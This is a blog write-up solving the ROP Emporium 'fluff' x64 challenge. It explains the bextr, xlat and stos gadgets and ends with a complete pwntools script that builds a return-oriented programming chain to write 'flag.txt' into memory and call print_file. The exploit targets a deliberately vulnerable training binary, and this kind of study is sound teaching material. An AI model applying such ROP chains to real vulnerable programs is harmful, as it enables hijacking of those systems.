---
layout: page
permalink: /ROP_emporium/ROP-x64-Challenge-6
title: ROP x64 Challenge 6
status: done
type: page
published: true
comments: true
date: 2022-07-13
---
## Challenge 6

We're making good progress and these challenges and we only have a couple more to go, however we won't always have the perfect gadgets available for us to use, and that's what this challenge prepares us for.

The idea is the same as before, write "flag.txt" to the binary and then call the print_file() function with that string as the first argument. So, let's poke around and see what we have to work with.

```
pwndbg> ropper -- --search "mov [%] %"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: mov [%] %
```

and we find nothing...


The challenge description says:
> **Some useful(?) gadgets are available at the `questionableGadgets` symbol.**

so let's see what we have to work with there.

```
pwndbg> disass questionableGadgets 
Dump of assembler code for function questionableGadgets:
   0x0000000000400628 <+0>:     xlat   BYTE PTR ds:[rbx]
   0x0000000000400629 <+1>:     ret    
   0x000000000040062a <+2>:     pop    rdx
   0x000000000040062b <+3>:     pop    rcx
   0x000000000040062c <+4>:     add    rcx,0x3ef2
   0x0000000000400633 <+11>:    bextr  rbx,rcx,rdx
   0x0000000000400638 <+16>:    ret    
   0x0000000000400639 <+17>:    stos   BYTE PTR es:[rdi],al
   0x000000000040063a <+18>:    ret    
   0x000000000040063b <+19>:    nop    DWORD PTR [rax+rax*1+0x0]
End of assembler dump.
```

The only thing that seems super interesting off the bat is the gadget starting at +2. With that gadget we can control $rdx and $rcx. Although I don't know what the `bextr` instruction does, I can guess that we control $rbx as well with that instruction since the inputs are rdx and rcx. Otherwise, I'm guessing the other 2 gadgets are usefullish, so I should probably do some research on understanding what they do.  


First let's look at `bextr` because we're defiantly going to be calling that. From googling I found this [BEXTR — Bit Field Extract](https://www.felixcloutier.com/x86/bextr) manual(?) page that describes it as
> Extracts contiguous bits from the first source operand (the second operand) using an index value and length value specified in the second source operand (the third operand). Bit 7:0 of the second source operand specifies the starting bit position of bit extraction. A START value exceeding the operand size will not extract any bits from the second source operand. Bit 15:8 of the second source operand specifies the maximum number of bits (LENGTH) beginning at the START position to extract. Only bit positions up to (OperandSize -1) of the first source operand are extracted. The extracted bits are written to the destination register, starting from the least significant bit. All higher order bits in the destination operand (starting at bit position LENGTH) are zeroed. The destination register is cleared if no bits are extracted.

Which I found a little confusing, but gave me the idea that this take bits from the first argument and puts them in the destination based on the second argument. Since we control both arguments (rdx and rdc), this confirms my idea that we can control the destination register (rbx in this case).

After a little more googling, I found [this](https://stackoverflow.com/questions/70208751/how-does-the-bextr-instruction-in-x86-work) stack overflow post about someone asking the same question and I found this answer very helpful.

> A picture might help. Say the starting bit is 5 and the length is 9. Then if we have
```
Input : 11010010001110101010110011011010 = 0xd23aacda
                          |-------|
                              \
                               \
                                \
                                 v
                               |-------|
Output: 00000000000000000000000101100110 = 0x00000166
```
> The desired block of bits goes to the least significant bits of the output, and the remaining bits of the output become 0.

So with these 2 explanations combined I was able to get the idea that we take a bit field stored in the first argument and then write a chunk of it into the destination and what chunk depends on the second argument. 

If I set this instruction to start at the 0th bit and copy 64 bits, that means I can copy everything from the second argument into the destination.

So,
```ASM
bextr  rbx,rcx,0xff00
```
and
```
mov  rbx, rcx
```
are equivalent because the ff part says copy everything and the 00 part says start at the 0th bit.




Now let's look at the `xlat   BYTE PTR ds:[rbx]` instruction because we have control of the rbx register in it. From the same website [XLAT/XLATB — Table Look-up Translation](https://www.felixcloutier.com/x86/xlat:xlatb) we get the following description.

> Locates a byte entry in a table in memory, using the contents of the AL register as a table index, then copies the contents of the table entry back into the AL register. The index in the AL register is treated as an unsigned integer. The XLAT and XLATB instructions get the base address of the table in memory from either the DS:EBX or the DS:BX registers (depending on the address-size attribute of the instruction, 32 or 16, respectively). (The DS segment may be overridden with a segment override prefix.)
> ...
> AL ← (RBX + ZeroExtend(AL));

So this instruction writes a value from a table (so a memory location) into AL. Which means if we can get control of this we can write basically any value into AL that exists in the binary which is probably all byte combinations because AL only stores a single byte. The only problem is that it takes AL into account so we need to figure out a way to set AL to a known value.

Looking through the binary, we are able to find an argument that nulls eax which would null out the al register.

```
pwndbg> ropper -- --search "mov ?a?"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: mov ?a?

[INFO] File: /root/working/fluff/fluff_64/fluff
0x0000000000400610: mov eax, 0; pop rbp; ret; 
```

So now if we use the `bextr` gadget to control rbx and null out eax (and by extension al). We have control over rbx, rcx, rdx, and al. Which is awesome, but still doesn't get us a huge amount closer to writing our string so let's hope the last gadget is usefull.


Looking at the `stos   BYTE PTR es:[rdi],al` instruction we may be in luck. Before even doing any research we can guess that it may write to memory because the first part after the instruction (the destination) is a Byte PTR to memory. In fact it's a pointer control by rdi (which we control), and the second argument is al (which we also control), so we may be in luck.


Ok with hopes high let's look over the [manual page](https://www.felixcloutier.com/x86/stos:stosb:stosw:stosd:stosq) for stos. 

> In non-64-bit and default 64-bit mode; stores a byte, word, or doubleword from the AL, AX, or EAX register (respectively) into the destination operand. The destination operand is a memory location, the address of which is read from either the ES:EDI or ES:DI register (depending on the address-size attribute of the instruction and the mode of operation). The ES segment cannot be overridden with a segment override prefix.


This seems to confirm exactly what we wanted. The instruction will store the byte in AL into the destination pointed to by rdi.


So now we have everything we need to write an arbitrary byte to any location in memory and if we do that repeatedly we can write our string. After double checking, we also see that we have a pop rdi gadget we can use to place it and then call the print_file() function. With all of that combined we can make this exploit.

```
pwndbg> ropper -- --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: /root/working/fluff/fluff_64/fluff
0x00000000004006a3: pop rdi; ret; 
```

The stack to place one character would be the following.
```
         | stack          |
         | -------------- |
32 bytes | start buffer   |
8  bytes | base pointer   | 
8  bytes | gadget 2       | # gadget to to control rdx, rcx, rbx       
8  bytes | 0xff00         | # control bits for length and starting loc for bextr
8  bytes | rcx val-0x3ef2 | # rcx val that gets copied to rbx, must sub 0x3ef2 because of add inst
8  bytes | null_eax gadget| # set the al value to 0 for the xlat instruction
8  bytes | 0xdeadbeef     | # extra junk because pop rbp is in the null eax gadget
8  bytes | gadget 1       | # place they byte at [rbx+al] into al             
8  bytes | pop rdi gadget | # place the location to write to in rdi
8  bytes | write_loc      | #                                                               
8  bytes | Gadget 3       | # Places al into [rdi]
8  bytes | -------------- |

```
```
   0x0000000000400628 <+0>:     xlat   BYTE PTR ds:[rbx]        # Gadget 1
   0x0000000000400629 <+1>:     ret    
   0x000000000040062a <+2>:     pop    rdx                      # Gadget 2
   0x000000000040062b <+3>:     pop    rcx
   0x000000000040062c <+4>:     add    rcx,0x3ef2
   0x0000000000400633 <+11>:    bextr  rbx,rcx,rdx
   0x0000000000400638 <+16>:    ret    
   0x0000000000400639 <+17>:    stos   BYTE PTR es:[rdi],al     # Gadget 3
   0x000000000040063a <+18>:    ret    

```

After coding up my first exploit it would fail after writing a couple of characters. It took a little debugging, but I found out that the read would only read in 512 characters and my exploit was close to 900 which was way to long. So I went back and found a couple of areas that I could trim down the exploit. For example, I discovered that the stosb instruction incremented the destination by 1 every time it was run, so after setting rdi once, I didn't have to continue to reset it. I also saw that rdx was never touched, so it could be set once. After trimming down the exploit I was left with this.
```Python
#!/usr/bin/python3

from pwn import *

write_loc 	= 0x601029
print_file 	= p64(0x400620)

target		= "./fluff"
back_junk 	= b"B" * 20

# The amount to fill the buffer
junk = b'A' * 0x20

# The 8 bytes to fill the new base pointer from the leave
new_bp = p32(0xc0deba5e)*2
badChars = b"xga."

# 0040069a: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
pop_rbx_size = 0
rdx_set = False
# unpacker_64 = make_unpacker(64)
def pop_rbx(rbx):
	global unpacker_64
	global rdx_set
	if not rdx_set:
		returnPayload = p64(0x40062a)
		#rdx val, control for bextr
		# should start at bit 0 and then copy 64 bit
		returnPayload += p64(0xff00)
		rdx_set = True
	else:
		returnPayload = p64(0x40062a + 1)
	# rcx val
	# this will get placed into rbx after + 0x3ef2
	returnPayload += p64( (rbx) - 0x3ef2)
	global pop_rbx_size
	pop_rbx_size += len(returnPayload)
	return returnPayload



xlatb_gaget	    = p64(0x0400628)
# 0400610: mov eax, 0; pop rbp; ret;
null_eax_gaget	    = p64(0x0400610)
def write_al(location):
	returnPayload  = null_eax_gaget
	returnPayload += new_bp
	returnPayload += pop_rbx(location)
	returnPayload += xlatb_gaget

	return returnPayload

elf = ELF(target)
def find_byte(c):
	return next(elf.search(c))


pop_rdi_gaget = p64(0x04006a3)
def pop_rdi(val):
	returnPayload = pop_rdi_gaget
	returnPayload += p64(val)
	return returnPayload


# stosb byte ptr [rdi], al; ret;
stosb_gaget = p64(0x0400639)


rdi_set = False

def write_byte(dest, c):
	byte_loc = find_byte(c)
	
	# place the value in byte_loc into al
	returnPayload  = write_al(byte_loc)
	global rdi_set
	if not rdi_set:
		returnPayload += pop_rdi(dest)
		rdi_set = True
	returnPayload += stosb_gaget
	return returnPayload



def write_string(destination, string):
	dest = destination
	returnPayload = b""
	global rdi_set 
	rdi_set= False
	for i in range(len(string)):
		returnPayload += write_byte(dest, string[i])
		dest += 1
	
	return returnPayload

"""
Place a string (1st arg) into the location
given by the 2nd arg. Note the 2nd arg should be 
packed
"""
import binascii
def print_payload(payload):
	for i in range(0, len(payload), 8):
		continue
            # print(binascii.hexlify(payload[i:i+8]))

io = process(target)

#Fill up the buffer and the base pointer
payload = junk + new_bp

payload += write_string(write_loc, b"flag.txt")

# This is the vaddr of system
# First return to the location of the pop rdi
payload += pop_rdi(write_loc)
payload += print_file

payload += back_junk


# print("The payload is:")
# print(payload)
print("Payload size is:" + str(len(payload)))
print("Pop RBX takes up: " + str(pop_rbx_size))
input("Hit enter to apptempt exploit")
print(io.clean(0.5).decode("utf-8"))
io.send(payload)

input("exploit sent hit enter to end")

print(io.clean(0.5).decode("utf-8"))
sleep(1)

f = open('./payload', 'wb')
f.write(payload)
f.close()

```
